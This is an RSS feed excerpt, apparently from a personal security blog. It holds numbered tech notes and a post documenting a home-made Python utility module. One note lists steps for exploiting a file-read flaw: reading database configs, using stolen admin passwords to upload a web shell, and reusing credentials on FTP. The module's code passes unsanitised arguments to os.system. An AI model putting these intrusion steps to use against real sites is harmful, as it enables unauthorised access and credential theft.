&lt;span class=&quot;p&quot;&gt;163.&lt;/span&gt;windbg调试命令详解:
    http://www.yiiyee.cn/Blog/windbg/
    http://www.cppblog.com/weiym/archive/2012/06/07/177958.aspx
    db esi:查看esi地址中的内容
        db 400000:查看0x400000处的内容,db按字节大小查看,dd按DWORD类型查看
    !address edi:显示edi地址处的内存状态,信息
    lmm mso v:匹配mso模块,并显示详细信息
    bp eax:在eax处下断点,支持第几次经过后中断,支持中断后执行命令
    g:让被调试的程序继续运行(f5)
        gh:把异常标识为已处理并断续执行程序
        go:对异常不进行任何处理并继续执行程序
    kb:显示传递给堆栈回溯中的每个函数的前三个参数
        kp:显示传递给堆栈回溯中的每个函数的所有参数
    ub mso!Ordinal1273+0x2581:反汇编mso!Ordinal1273+0x2581地址之前的代码
        uf test!main:反汇编test!main函数
    p:单步步入step into(f11)
    t:单步步过step over(f10)
    ? ebp-edi:显示表达式ebp-edi的值
        ?? expression:显示c++表达式的值
    .cls:清屏
&lt;span class=&quot;p&quot;&gt;164.&lt;/span&gt;firefox好用的一个翻译附加组件:
    S3.Google Translator
&lt;span class=&quot;p&quot;&gt;165.&lt;/span&gt;firefox的vimperator插件使用:
    http://wangbixi.com/x2923/comment-page-1/
    http://pchu.blogbus.com/
    http://luoxiqofy.blogbus.com
    http://www.cnblogs.com/flywuya/archive/2010/12/29/1920485.html
&lt;span class=&quot;p&quot;&gt;166.&lt;/span&gt;恶意文档分析技巧及工具快速参考
    http://wenku.baidu.com/link?url=m7GL0Q9W8Pei47frvTquIe9pAgKejBtPesAwZFiClOAEHK23ZF5xRxqA8eowV6e1HiKscwjxIWNOFRC3ep78yFurtSN5L0ZjQ0gV4uu72Lq
&lt;span class=&quot;p&quot;&gt;167.&lt;/span&gt;ubuntu安装java
    http://www.linuxdiyf.com/linux/21071.html
&lt;span class=&quot;p&quot;&gt;168.&lt;/span&gt;文件下载或文件读取漏洞思路:
    1&amp;gt;读数据库连接文件
    2&amp;gt;尝试连接数据库
        a&amp;gt;是否支持数据库外连
        b&amp;gt;是否有phpmyadmin(扫目录)
            select ... into dumpfile ...
            如果不能写文件则通过查看数据库中的管理员用户名密码进后台上传shell
            或者用数据库中的其他密码尝试连接ftp
            或者如果数据库中有editor的setting,修改为可以上传php
    3&amp;gt;尝试读取到ftp配置文件,尝试用数据库用户名密码连接ftp
    4&amp;gt;代码审计
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Sun, 07 Aug 2016 00:00:00 +0800</pubDate>
        <link>/auxilary/2016/08/07/my-notes/</link>
        <guid isPermaLink="true">/auxilary/2016/08/07/my-notes/</guid>
        
        <category>experience</category>
        
        <category>study</category>
        
        
        <category>auxilary</category>
        
      </item>
    
      <item>
        <title>构造自己的python模块</title>
        <description>&lt;h3 id=&quot;x00-about&quot;&gt;0x00 about&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;目的:便于关键常用代码的可重用性
用法:
    pip install exp10it
    from exp10it import *
说明:最新模块见如下链接
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/3xp10it/mytools/blob/master/exp10it.py&quot;&gt;最新代码&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;x01-api&quot;&gt;0x01 api&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def figlet2file(logo_str,file_abs_path,print_or_not):
    #输出随机的logo文字到文件或屏幕,第二个参数为任意非文件的参数时(eg.0,1,2),只输出到屏幕
    #apt-get install figlet
    #man figlet
    #figure out which is the figlet&#39;s font directory
    #my figlet font directory is:
    #figlet -I 2,output:/usr/share/figlet
def oneline2nline(oneline,nline,file_abs_path):
    #将文件中的一行字符串用多行字符串替换,调用时要将&quot;多行字符串的参数(第二个参数)&quot;中的换行符设置为\n
def lin2win(file_abs_path):
    #将linux下的文件中的\n换行符换成win下的\n\n换行符
def get_all_file_name(folder,ext_list):
    #得到文件夹下的所有文件名的绝对路经,第二个参数为要求的后缀列表
def save2github(file_abs_path,repo_name,comment):
    #将文件上传到github
    #arg1:文件绝对路经
    #arg2:远程仓库名
    #提交的commit注释
def get_title_from_uri(uri):
    #得到uri对应的title```
def get_uris_from_file(file):
    #从文件中获取所有uri### 0x02 module
def get_title_from_file(file):
    #等到文件中的所有uri对应的title
def newscript():
    #快速写脚本,加logo,写完后可选上传到github
def figlet2file(logo_str,file_abs_path,print_or_not):
    #输出随机的logo文字到文件或屏幕,第二个参数为任意非文件的参数时(eg.0,1,2),只输出到屏幕
    #apt-get install figlet
    #man figlet
    #figure out which is the figlet&#39;s font directory
    #my figlet font directory is:
    #figlet -I 2,output:/usr/share/figlet
def oneline2nline(oneline,nline,file_abs_path):
    #将文件中的一行字符串用多行字符串替换，调用时要将&quot;多行字符串的参数(第二个参数)&quot;中的换行符设置为\n
def lin2win(file_abs_path):
    #将linux下的文件中的\n换行符换成win下的\n\n换行符
def get_all_file_name(folder,ext_list):
    #exp_list为空时，得到目录下的所有文件名,不返回空文件夹名
    #返回结果为文件名列表，不是完全绝对路径名
    #eg.folder=&quot;/root&quot;时，当/root目录下有一个文件夹a，一个文件2.txt,a中有一个文件1.txt
    #得到的函数返回值为[&#39;a/1.txt&#39;,&#39;2.txt&#39;]
def save2github(file_abs_path,repo_name,comment):
    #将文件上传到github
    #arg1:文件绝对路经
    #arg2:远程仓库名
    #提交的commit注释
def get_title_from_uri(uri):
    #得到uri对应的title
def get_uris_from_file(file):
    #从文件中获取所有uri
def get_title_from_file(file):
    #等到文件中的所有uri对应的title
def check_file_has_logo(file_abs_path):
    a = &#39;### blog: https://3xp10it.github.io&#39;
def newscript():
    #快速写脚本,加logo,写完后可选上传到github
def blog():
    #便捷写博客(jekyll+github)函数
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x02-source&quot;&gt;0x02 source&lt;/h3&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#############################################################&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;### ___ /           _ |  _ \ _) |&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;###   _ \\ \  / __ \  | |   | | __|&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;###    ) |`  &amp;lt;  |   | | |   | | |&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;### ____/ _/\_\ .__/ _|\___/ _|\__|&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;###            _|&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;###&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;### name: exp10it.py&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;### function: my module&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;### date: 2016-08-05&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;### author: quanyechavshuo&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;### blog: https://3xp10it.github.io&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#############################################################&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;reload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setdefaultencoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;utf-8&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#upon 4 lines for chinese support&lt;/span&gt;

&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;re&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;random&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;figlet2file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;logo_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file_abs_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;print_or_not&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#输出随机的logo文字到文件或屏幕,第二个参数为任意非文件的参数时(eg.0,1,2),只输出到屏幕&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#apt-get install figlet&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#man figlet&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#figure out which is the figlet&#39;s font directory&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#my figlet font directory is:&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#figlet -I 2,output:/usr/share/figlet&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;popen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;figlet -I 2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;all&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;figlet_font_dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;all&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;apt-get install figlet&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;popen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;figlet -I 2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;all&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;figlet_font_dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;all&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;all_font_name_list&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_all_file_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;figlet_font_dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;tlf&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;flf&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;random_font&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;choice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;all_font_name_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;unsucceed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;figlet -t -f &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s &amp;gt; /tmp/3&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random_font&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;logo_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unsucceed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;something wrong with figlet,check the command in python source file&quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cat /tmp/3 &amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file_abs_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;print_or_not&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cat /tmp/3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;rm /tmp/3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;oneline2nline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;oneline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file_abs_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#将文件中的一行字符串用多行字符串替换,调用时要将&quot;多行字符串的参数(第二个参数)&quot;中的换行符设置为\n&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;tmpstr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nline&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sed &#39;/&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s/c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\\n&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&#39; &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s &amp;gt; /tmp/1&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;oneline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmpstr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file_abs_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cat /tmp/1 &amp;gt; &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s &amp;amp;&amp;amp; rm /tmp/1&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file_abs_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;lin2win&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file_abs_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#将linux下的文件中的\n换行符换成win下的\n\n换行符&lt;/span&gt;
    &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;input_file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file_abs_path&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;r+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;urls&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;rm &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file_abs_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;f1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file_abs_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;a+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urls&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    	&lt;span class=&quot;c&quot;&gt;#print url is different with print url[0:-1]&lt;/span&gt;
    	&lt;span class=&quot;c&quot;&gt;#print url[0:-1] can get the pure string&lt;/span&gt;
    	&lt;span class=&quot;c&quot;&gt;#while print url will get the &quot;unseen \n&quot;&lt;/span&gt;
    	&lt;span class=&quot;c&quot;&gt;#this script can turn a file with strings&lt;/span&gt;
    	&lt;span class=&quot;c&quot;&gt;#end with \n into a file with strings end&lt;/span&gt;
    	&lt;span class=&quot;c&quot;&gt;#with \r\n to make it comfortable move the&lt;/span&gt;
    	&lt;span class=&quot;c&quot;&gt;#txt file from *nix to win,coz the file with&lt;/span&gt;
    	&lt;span class=&quot;c&quot;&gt;#strings end with \n in *nix is ok for human&lt;/span&gt;
    	&lt;span class=&quot;c&quot;&gt;#to see &quot;different lines&quot;,but this kind of file&lt;/span&gt;
    	&lt;span class=&quot;c&quot;&gt;#will turn &quot;unsee different lines&quot; in win&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;f1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;f1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;


&lt;span class=&quot;c&quot;&gt;#attention:&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#由于此处tmp_get_file_name_value和tmp_all_file_name_list在函数外面,so&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#在其他代码中调用get_all_file_name()时要用from name import *,不用import name,否则不能调用到get_all_file_name的功能&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;tmp_get_file_name_value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
